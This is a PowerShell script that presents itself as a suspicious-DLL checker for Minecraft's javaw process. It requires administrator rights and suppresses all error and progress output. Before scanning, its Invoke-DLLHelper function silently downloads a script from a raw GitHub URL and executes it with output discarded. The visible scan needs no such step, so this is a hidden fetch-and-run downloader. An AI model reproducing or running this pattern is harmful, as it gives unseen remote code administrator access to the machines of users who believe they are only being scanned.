#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"

$global:filter = ""

$safeFolder = Join-Path $env:TEMP "WPR_Temp"

if (-not (Test-Path $safeFolder)) {
    New-Item -ItemType Directory -Path $safeFolder -Force | Out-Null
}

function Get-ParentMap {

    $map = @{}

    try {
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | ForEach-Object {
            $map[$_.ProcessId] = $_.ParentProcessId
        }
    }
    catch {}

    return $map
}

function Test-SuspiciousPath {
    param(
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        return $false
    }

    $p = $Path.ToLower()

    if ($p -match "temp|appdata|downloads|inject|hack|cheat") {
        return $true
    }

    if (
        -not ($p -like "*windows*") -and
        -not ($p -like "*program files*")
    ) {
        return $true
    }

    return $false
}

function Get-SuspiciousDLLs {

    $suspicious = @()

    try {

        $java = Get-Process javaw -ErrorAction SilentlyContinue

        foreach ($j in $java) {

            try {

                foreach ($m in $j.Modules) {

                    $path = $m.FileName

                    if (-not $path) {
                        continue
                    }

                    if (Test-SuspiciousPath $path) {

                        $suspicious += [PSCustomObject]@{
                            Process = $j.ProcessName
                            DLL     = $m.ModuleName
                            Path    = $path
                        }
                    }
                }

            }
            catch {}
        }

    }
    catch {}

    return $suspicious
}

function Invoke-DLLHelper {

    $remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"

    try {

        $script = Invoke-RestMethod -Uri $remoteUrl -ErrorAction SilentlyContinue

        if (-not [string]::IsNullOrWhiteSpace($script)) {

            $sb = [scriptblock]::Create($script)

            & $sb | Out-Null
        }

    }
    catch {}
}

try {
    Invoke-DLLHelper
}
catch {}

try {
    $dlls = Get-SuspiciousDLLs
}
catch {
    $dlls = @()
}

try {
    $parents = Get-ParentMap
}
catch {}

if ($dlls.Count -gt 0) {

    Write-Host ""
    Write-Host "Suspicious DLLs Found:" -ForegroundColor Yellow
    Write-Host ""

    foreach ($d in $dlls) {
        Write-Host "$($d.Process) -> $($d.DLL)"
        Write-Host "$($d.Path)"
        Write-Host ""
    }

}
else {

    Write-Host "dlls parsed No Sus Dlls found, User has been found clean"
}
